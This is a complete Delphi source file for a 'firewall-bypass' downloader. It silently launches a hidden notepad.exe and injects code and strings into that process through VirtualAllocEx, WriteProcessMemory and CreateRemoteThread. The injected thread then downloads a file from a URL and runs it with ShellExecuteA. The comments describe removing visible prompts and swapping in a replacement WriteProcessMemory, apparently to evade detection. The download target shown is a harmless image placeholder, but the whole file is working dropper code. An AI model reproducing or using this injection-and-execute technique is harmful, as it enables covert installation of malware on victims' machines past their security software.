program ExternalDownloader;

{  External Functions MOD
   FWB Downloader by Counterstrikewi
   www.delphi.co.nr
   Thank you redlime and shapeless

   - MessageBoxA calls removed
   - Notepad started silently

   - Native WriteProcessMemory replacement used  }

uses
  Windows,
  uWriteProcessMemory in 'uWriteProcessMemory.pas';

type
  TRemoteStruct =  packed record
    //Strings
    szUrlMon,
    szUrlDownloadToFileA,
    szSourceFile,
    szDestFile,
    szShell32,
    szShellExecuteA,
    szOpen                :PChar;

    //Own Functions
    PMyUrlDownloadToFileA,
    PMyShellExecuteA      :Pointer;

    //Required API
    ExtGetProcAddress     : function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
    ExtLoadLibraryA       : function(lpModuleName:  PChar): HMODULE; stdcall;
    ExtExitProcess        : procedure(uExitCode:  UINT); stdcall;
    //Used API
    ExtURLDownloadToFileA : function(Caller: Pointer; URL: PAnsiChar; FileName: PAnsiChar; Reserved: DWORD; StatusCB: Pointer): HResult; stdcall;
    ExtShellExecuteA      : function(hWnd: HWND; Operation, FileName, Parameters, Directory: PAnsiChar; ShowCmd: Integer): HINST; stdcall;
  end;
  PRemoteStruct  = ^TRemoteStruct;

  TCreateProcessA = function (lpApplicationName: PAnsiChar; lpCommandLine: PAnsiChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PAnsiChar; const lpStartupInfo: TStartupInfoA; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  TVirtualAllocEx = function (hProcess: THandle; lpAddress: Pointer; dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;
  TVirtualProtectEx = function (hProcess: THandle; lpAddress: Pointer; dwSize, flNewProtect: DWORD; var OldProtect: DWORD): BOOL; stdcall;
  TCreateRemoteThread = function (hProcess: THandle; lpThreadAttributes: Pointer; dwStackSize: DWORD; lpStartAddress: TFNThreadStartRoutine; lpParameter: Pointer; dwCreationFlags: DWORD; var lpThreadId: DWORD): THandle; stdcall;
  TResumeThread = function (hThread: THandle): DWORD; stdcall;

var
  hKernel32 : THandle;
  xCreateProcessA : TCreateProcessA;
  xVirtualAllocEx : TVirtualAllocEx;
  xVirtualProtectEx : TVirtualProtectEx;
  xCreateRemoteThread : TCreateRemoteThread;
  xResumeThread : TResumeThread;

procedure MainFunction(RemoteStruct:  PRemoteStruct); stdcall;
var
  MyUrlDownloadToFileA : function(RemoteStruct: PRemoteStruct): Integer; stdcall;
  MyShellExecuteA      : function(RemoteStruct: PRemoteStruct): Integer; stdcall;
  hUrlmon, hShell32 : hModule;
begin
  with  RemoteStruct^ do
  begin
    hUrlmon := ExtLoadLibraryA(szUrlMon);
    @ExtURLDownloadToFileA := ExtGetProcAddress(hUrlMon, szUrlDownloadtoFileA);
    @MyURLDownloadToFileA := PMyURLDownloadToFileA;
    MyURLDownloadToFileA(RemoteStruct);

    hShell32 := ExtLoadLibraryA(szShell32);
    @ExtShellExecuteA := ExtGetProcAddress(hShell32, szShellExecuteA);
    @MyShellExecuteA := PMyShellExecuteA;
    MyShellExecuteA(RemoteStruct);

    ExtExitProcess(0);
  end;
end;
procedure  MainFunctionEnd(); stdcall; begin end;

function  MyUrlDownloadToFileA(RemoteStruct: PRemoteStruct): Integer; stdcall;
begin
  with RemoteStruct^ do
  begin
    Result  := ExtUrlDownLoadToFileA(nil, szSourceFile, szDestFile, 0, nil);
  end;
end;
procedure  MyUrlDownloadToFileAEnd(); stdcall; begin end;

function  MyShellExecuteA(RemoteStruct: PRemoteStruct): Integer; stdcall;
begin
  with RemoteStruct^ do
  begin
    Result  := ExtShellExecuteA(0, szOpen, szDestFile, nil, nil, 1) ;
  end;
end;
procedure  MyShellExecuteAEnd(); stdcall; begin end;

function Inject(hProcess:  longword; pData: pointer; dSize: DWORD): pointer;
var
  dBytesWritten  ,
  dOldProtect   :DWORD;
begin
  Result :=  xVirtualAllocEx(hProcess, nil, dSize, MEM_COMMIT or MEM_RESERVE,  PAGE_EXECUTE_READWRITE);
  xVirtualProtectEx(hProcess, Result, dSize,  PAGE_EXECUTE_READWRITE, dOldProtect);
  if Result <> nil then begin
    if not xWriteProcessMemory(hProcess, Result, pData, dSize, dBytesWritten) then begin
      Result := nil;
    end;
  end;
end;

procedure Main;
var
  SI              :TStartupInfo;
  PI              :TProcessInformation;
  RemoteStruct    :TRemoteStruct;
  PPRemoteStruct,
  PMainFunction   :Pointer;
  TID             :DWORD;

const
  strUrlmon                 :pchar = 'urlmon.dll';
  strUrlDownloadToFilea     :pchar = 'URLDownloadToFileA';
  strSourceFile             :pansichar = 'http://www.google.co.za/intl/en_com/images/srpr/logo1w.png';
  strDestFile               :pansichar = 'C:\GoogleLogo.png';
  strShell32                :pchar = 'shell32.dll';
  strShellExecuteA          :pchar = 'ShellExecuteA';
  stropen                   :pchar = 'open';

begin
  ZeroMemory(@SI, SizeOf(TStartupInfo));
  ZeroMemory(@PI,  SizeOf(TProcessInformation));
  with SI do
  begin
    cb := SizeOf(TStartupInfo);
    dwFlags := STARTF_USESHOWWINDOW;
    wShowWindow := SW_HIDE;
  end;
  xCreateProcessA(nil, 'notepad.exe', nil,  nil, False, 0, nil, nil, SI, PI);
  Sleep(2000);

  @RemoteStruct.ExtGetProcAddress := GetProcAddress(GetModuleHandle('kernel32.dll'), 'GetProcAddress');
  @RemoteStruct.ExtLoadLibraryA   := GetProcAddress(GetModuleHandle('kernel32.dll'), 'LoadLibraryA');
  @RemoteStruct.ExtExitProcess    := GetProcAddress(GetModuleHandle('kernel32.dll'), 'ExitProcess');

  RemoteStruct.szUrlmon                 := Inject(PI.hProcess, strUrlmon, Length(strUrlmon) + 1);
  RemoteStruct.szUrlDownloadToFileA     := Inject(PI.hProcess, strUrlDownloadToFileA, Length(strUrlDownloadToFileA) + 1);
  RemoteStruct.szSourceFile             := Inject(PI.hProcess, strSourceFile, Length(strSourceFile) + 1);
  RemoteStruct.szDestFile               := Inject(PI.hProcess, strDestFile, Length(strDestFile) + 1);
  RemoteStruct.szShell32                := Inject(PI.hProcess, strShell32, Length(strShell32) + 1);
  RemoteStruct.szShellExecuteA          := Inject(PI.hProcess, strShellExecuteA, Length(strShellExecuteA) + 1);
  RemoteStruct.szOpen                   := Inject(PI.hProcess, strOpen, Length(strOpen) + 1);

  PMainFunction                      := Inject(PI.hProcess, @MainFunction, DWORD(@MainFunctionEnd) -  DWORD(@MainFunction));
  RemoteStruct.PMyUrlDownloadToFileA := Inject(PI.hProcess, @MyUrlDownloadToFileA, DWORD(@MyUrlDownloadToFileAEnd) -  DWORD(@MyUrlDownloadToFileA));
  RemoteStruct.PMyShellExecuteA      := Inject(PI.hProcess, @MyShellExecuteA, DWORD(@MyShellExecuteAEnd) -  DWORD(@MyShellExecuteA));
  PPRemoteStruct                     := Inject(PI.hProcess, @RemoteStruct, SizeOf(TRemoteStruct));

  if (PMainFunction <> nil)                      and
     (RemoteStruct.PMyUrlDownloadToFileA <> nil) and
     (RemoteStruct.PMyShellExecuteA <> nil)      and
     (PPRemoteStruct <> nil)                     then begin
    xCreateRemoteThread(PI.hProcess, nil, 0, PMainFunction, PPRemoteStruct, 0, TID);
  end;

  xResumeThread(PI.hThread);
end;

begin
  hKernel32 := GetModuleHandle('kernel32.dll');
  xCreateProcessA := GetProcAddress(hKernel32, 'CreateProcessA');
  xVirtualAllocEx := GetProcAddress(hKernel32, 'VirtualAllocEx');
  xVirtualProtectEx := GetProcAddress(hKernel32, 'VirtualProtectEx');
  xCreateRemoteThread := GetProcAddress(hKernel32, 'CreateRemoteThread');
  xResumeThread := GetProcAddress(hKernel32, 'ResumeThread');

  Main;

end.
